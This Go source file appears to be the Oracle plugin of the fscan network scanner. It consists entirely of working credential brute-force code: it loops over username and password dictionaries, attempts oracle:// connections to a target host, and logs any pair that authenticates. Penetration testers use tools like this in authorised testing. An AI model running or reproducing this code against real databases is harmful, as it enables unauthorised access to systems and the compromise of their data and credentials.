package Plugins

import (
	"database/sql"
	"fmt"
	"github.com/shadow1ng/fscan/common"
	_ "github.com/sijms/go-ora/v2"
	"strings"
	"time"
)

func OracleScan(info *common.HostInfo) (tmperr error) {
	if common.IsBrute {
		return
	}
	starttime := time.Now().Unix()
	for _, user := range common.Userdict["oracle"] {
		for _, pass := range common.Passwords {
			pass = strings.Replace(pass, "{user}", user, -1)
			flag, err := OracleConn(info, user, pass)
			if flag == true && err == nil {
				return err
			} else {
				errlog := fmt.Sprintf("[-] oracle %v:%v %v %v %v", info.Host, info.Ports, user, pass, err)
				common.LogError(errlog)
				tmperr = err
				if common.CheckErrs(err) {
					return err
				}
				if time.Now().Unix()-starttime > (int64(len(common.Userdict["oracle"])*len(common.Passwords)) * common.Timeout) {
					return err
				}
			}
		}
	}
	return tmperr
}

func OracleConn(info *common.HostInfo, user string, pass string) (flag bool, err error) {
	flag = false
	Host, Port, Username, Password := info.Host, info.Ports, user, pass
	dataSourceName := fmt.Sprintf("oracle://%s:%s@%s:%s/orcl", Username, Password, Host, Port)
	db, err := sql.Open("oracle", dataSourceName)
	if err == nil {
		db.SetConnMaxLifetime(time.Duration(common.Timeout) * time.Second)
		db.SetConnMaxIdleTime(time.Duration(common.Timeout) * time.Second)
		db.SetMaxIdleConns(0)
		defer db.Close()
		err = db.Ping()
		if err == nil {
			result := fmt.Sprintf("[+] oracle %v:%v:%v %v", Host, Port, Username, Password)
			common.LogSuccess(result)
			flag = true
		}
	}
	return flag, err
}
